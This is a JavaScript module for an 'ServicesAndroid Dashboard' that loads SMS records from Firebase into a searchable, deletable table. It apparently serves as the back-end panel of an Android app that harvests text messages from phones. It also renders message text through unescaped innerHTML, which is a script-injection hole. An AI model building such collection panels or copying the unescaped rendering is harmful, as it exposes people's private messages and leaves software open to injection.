/* ==========================================
   ServicesAndroid Dashboard
   SMS Module
========================================== */

import { db, ref, onValue, remove } from "../firebase.js";
import { CONFIG } from "../config.js";

let smsData = [];

export function showSms() {

    document.getElementById("pageTitle").textContent = "SMS";

    document.getElementById("content").innerHTML = `

        <div class="card p-4">

            <div class="d-flex justify-content-between align-items-center flex-wrap mb-4">

                <div>

                    <h3>SMS</h3>

                    <p class="text-muted">

                        Total SMS :
                        <strong id="totalSms">0</strong>

                    </p>

                </div>

                <div style="max-width:350px;width:100%;">

                    <input
                        type="text"
                        id="searchSms"
                        class="form-control"
                        placeholder="Search Number, Message or Type">

                </div>

                <div>

                    <button
                        id="deleteSelected"
                        class="btn btn-warning me-2">

                        Delete Selected

                    </button>

                    <button
                        id="deleteAll"
                        class="btn btn-danger">

                        Delete All

                    </button>

                </div>

            </div>

            <div class="table-responsive">

                <table class="table table-hover table-striped align-middle">

                    <thead class="table-dark">

                        <tr>

                            <th style="width:5%">

                                <input
                                    type="checkbox"
                                    id="selectAll">

                            </th>

                            <th style="width:20%">Number</th>

                            <th style="width:12%">Type</th>

                            <th>Message</th>

                            <th style="width:22%">Date</th>

                        </tr>

                    </thead>

                    <tbody id="smsTable">

                        <tr>

                            <td colspan="5" class="text-center p-5">

                                Loading SMS...

                            </td>

                        </tr>

                    </tbody>

                </table>

            </div>

        </div>

    `;

    setupEvents();

    loadSms();

}

function loadSms() {

    onValue(ref(db, CONFIG.PATHS.SMS), (snapshot) => {

        smsData = [];

        if (snapshot.exists()) {

            snapshot.forEach(child => {

                smsData.push({

                    id: child.key,

                    ...child.val()

                });

            });

            smsData.sort((a, b) => {

                return (b.timestamp || 0) - (a.timestamp || 0);

            });

        }

        document.getElementById("totalSms").textContent = smsData.length;

        renderTable(smsData);

    });

}

function searchSms() {

    const keyword = document
        .getElementById("searchSms")
        .value
        .trim()
        .toLowerCase();

    if (keyword === "") {

        renderTable(smsData);

        return;

    }

    const filtered = smsData.filter((sms) => {

        return (

            (sms.number || "")
                .toLowerCase()
                .includes(keyword)

            ||

            (sms.message || "")
                .toLowerCase()
                .includes(keyword)

            ||

            (sms.type || "")
                .toLowerCase()
                .includes(keyword)

        );

    });

    filtered.sort((a, b) => {

        return (b.timestamp || 0) - (a.timestamp || 0);

    });

    renderTable(filtered);

}

function renderTable(data) {

    const table = document.getElementById("smsTable");

    if (data.length === 0) {

        table.innerHTML = `

            <tr>

                <td colspan="5" class="text-center p-5">

                    No SMS Found

                </td>

            </tr>

        `;

        return;

    }

    table.innerHTML = "";

    data.forEach((sms) => {

        table.innerHTML += `

            <tr>

                <td>

                    <input
                        type="checkbox"
                        class="smsCheck"
                        value="${sms.id}">

                </td>

                <td>${sms.number || "-"}</td>

                <td>${sms.type || "-"}</td>

                <td>${sms.message || "-"}</td>

                <td>${sms.date || "-"}</td>

            </tr>

        `;

    });

}

function setupEvents() {

    document
        .getElementById("searchSms")
        .addEventListener("input", searchSms);

    document
        .getElementById("selectAll")
        .addEventListener("change", function () {

            document
                .querySelectorAll(".smsCheck")
                .forEach(cb => {

                    cb.checked = this.checked;

                });

        });

    document
        .getElementById("deleteSelected")
        .addEventListener("click", deleteSelectedSms);

    document
        .getElementById("deleteAll")
        .addEventListener("click", deleteAllSms);

}

async function deleteSelectedSms() {

    const checked =
        document.querySelectorAll(".smsCheck:checked");

    if (checked.length === 0) {

        alert("Select at least one SMS.");

        return;

    }

    if (!confirm(`Delete ${checked.length} selected SMS from Firebase?`))
        return;

    for (const cb of checked) {

        try {

            await remove(
                ref(
                    db,
                    CONFIG.PATHS.SMS + "/" + cb.value
                )
            );

        } catch (error) {

            console.error(error);

        }

    }

}

async function deleteAllSms() {

    if (!confirm("Delete ALL SMS from Firebase?"))
        return;

    try {

        await remove(
            ref(
                db,
                CONFIG.PATHS.SMS
            )
        );

    } catch (error) {

        console.error(error);

    }

}